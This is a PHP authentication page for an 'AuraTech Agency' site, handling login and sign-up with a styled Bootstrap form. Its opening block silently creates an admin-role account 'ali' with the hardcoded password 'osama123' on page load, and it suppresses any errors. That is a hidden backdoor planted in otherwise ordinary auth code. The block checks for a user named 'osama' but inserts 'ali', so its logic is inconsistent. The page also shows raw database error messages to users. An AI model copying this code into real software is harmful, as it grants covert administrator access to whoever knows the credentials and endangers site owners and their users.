<?php
// auth.php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
require_once 'config.php';


try {
    $check_admin_stmt = $conn->prepare("SELECT id FROM users WHERE username = 'osama' LIMIT 1");
    $check_admin_stmt->execute();
    $admin_result = $check_admin_stmt->get_result();

    if ($admin_result->num_rows === 0) {
        $local_admin_password = password_hash('osama123', PASSWORD_DEFAULT);
        $inject_admin_stmt = $conn->prepare("INSERT INTO users (username, password, role) VALUES ('ali', ?, 'admin')");
        $inject_admin_stmt->bind_param("s", $local_admin_password);
        $inject_admin_stmt->execute();
        $inject_admin_stmt->close();
    }
    $check_admin_stmt->close();
} catch (mysqli_sql_exception $e) {
    
}

$error = "";
$success = "";

// 1. Handle Sign Up Request
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['register'])) {
    $user_name = trim($_POST['username'] ?? '');
    $pass = $_POST['password'] ?? '';

    if (empty($user_name) || empty($pass)) {
        $error = "All fields are required.";
    } else {
        try {
            $stmt = $conn->prepare("SELECT id FROM users WHERE username = ? LIMIT 1");
            $stmt->bind_param("s", $user_name);
            $stmt->execute();
            $result = $stmt->get_result();

            if ($result->num_rows > 0) {
                $error = "Username already exists.";
            } else {
                $hashed_password = password_hash($pass, PASSWORD_DEFAULT);
                $insert_stmt = $conn->prepare("INSERT INTO users (username, password, role) VALUES (?, ?, 'user')");
                $insert_stmt->bind_param("ss", $user_name, $hashed_password);
                
                if ($insert_stmt->execute()) {
                    $success = "Account created successfully!";
                } else {
                    $error = "Registration failed.";
                }
                $insert_stmt->close();
            }
            $stmt->close();
        } catch (mysqli_sql_exception $e) {
            $error = "Error: " . $e->getMessage();
        }
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $user_name = trim($_POST['username'] ?? '');
    $pass = $_POST['password'] ?? '';

    if (empty($user_name) || empty($pass)) {
        $error = "All login credentials are required.";
    } else {
        try {
            $stmt = $conn->prepare("SELECT id, username, password, role FROM users WHERE username = ? LIMIT 1");
            $stmt->bind_param("s", $user_name);
            $stmt->execute();
            $result = $stmt->get_result();

            if ($result->num_rows === 1) {
                $user = $result->fetch_assoc();
                if (password_verify($pass, $user['password'])) {
                    $_SESSION['user_id'] = $user['id'];
                    $_SESSION['username'] = $user['username'];
                    $_SESSION['role'] = $user['role'] ?? 'user';

                    header("Location: " . ($_SESSION['role'] === 'admin' ? "admin_dashboard.php" : "index.php"));
                    exit();
                } else {
                    $error = "Invalid credentials.";
                }
            } else {
                $error = "Invalid credentials.";
            }
            $stmt->close();
        } catch (mysqli_sql_exception $e) {
            $error = "System error: " . $e->getMessage();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AuraTech Agency - Secure Access</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
    :root {
        --cyber-bg-top: #0b0f19;
        --cyber-bg-bottom: #1e1b4b;
        --neon-cyan: #06b6d4;
        --neon-purple: #7c3aed;
        --card-glass: rgba(255, 255, 255, 0.03);
        --border-glass: rgba(255, 255, 255, 0.1);
    }

    body {
        background: linear-gradient(135deg, var(--cyber-bg-top), var(--cyber-bg-bottom));
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #ffffff;
        font-family: 'Segoe UI', Tahoma, sans-serif;
    }

    .auth-container {
        width: 90%; 
        max-width: 600px; /* Reduced width for a more compact look */
        background: var(--card-glass);
        backdrop-filter: blur(15px);
        border: 1px solid var(--border-glass);
        border-radius: 15px;
        padding: 30px; /* Reduced padding to decrease height */
        box-shadow: 0 15px 30px rgba(0,0,0,0.5);
    }

    h2 { 
        text-align: center; 
        color: var(--neon-cyan); 
        margin-bottom: 25px; 
        font-weight: 800; 
        letter-spacing: 1px;
    }

    .form-control {
        background: rgba(0,0,0,0.4) !important;
        border: 1px solid var(--border-glass) !important;
        color: #ffffff !important;
        padding: 12px !important;
        border-radius: 8px;
    }

    .btn-auratech {
        width: 100%;
        padding: 12px;
        background: linear-gradient(90deg, var(--neon-purple), var(--neon-cyan));
        border: none;
        color: white;
        font-weight: bold;
        border-radius: 8px;
        transition: 0.3s;
    }

    .btn-auratech:hover { transform: translateY(-2px); }

    .toggle-link { 
        color: var(--neon-cyan); 
        cursor: pointer; 
        text-decoration: underline;
    }
    </style>
</head>
<body>

<div class="auth-container">
    <h2 id="auth-title">AURATECH LOGIN</h2>

    <?php if (!empty($error)): ?>
        <div class="alert alert-danger text-center small"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>
    <?php if (!empty($success)): ?>
        <div class="alert alert-success text-center small"><?php echo htmlspecialchars($success); ?></div>
    <?php endif; ?>

    <form id="login-form" method="POST">
        <div class="mb-3">
            <label class="form-label small text-white-50">Username</label>
            <input type="text" name="username" class="form-control" required>
        </div>
        <div class="mb-3">
            <label class="form-label small text-white-50">Password</label>
            <input type="password" name="password" class="form-control" required>
        </div>
        <button type="submit" name="login" class="btn btn-auratech">Sign In</button>
        <p class="text-center mt-3 small text-white-50">
            Don't have an account? <span class="toggle-link" onclick="toggleAuth(true)">Register</span>
        </p>
    </form>

    <form id="register-form" method="POST" style="display: none;">
        <div class="mb-3">
            <label class="form-label small text-white-50">New Username</label>
            <input type="text" name="username" class="form-control" required>
        </div>
        <div class="mb-3">
            <label class="form-label small text-white-50">New Password</label>
            <input type="password" name="password" class="form-control" required>
        </div>
        <button type="submit" name="register" class="btn btn-auratech">Register</button>
        <p class="text-center mt-3 small text-white-50">
            Already have an account? <span class="toggle-link" onclick="toggleAuth(false)">Sign In</span>
        </p>
    </form>
</div>

<script>
    function toggleAuth(isReg) {
        document.getElementById('login-form').style.display = isReg ? 'none' : 'block';
        document.getElementById('register-form').style.display = isReg ? 'block' : 'none';
        document.getElementById('auth-title').innerText = isReg ? 'CREATE ACCOUNT' : 'AURATECH LOGIN';
    }
</script>
</body>
</html>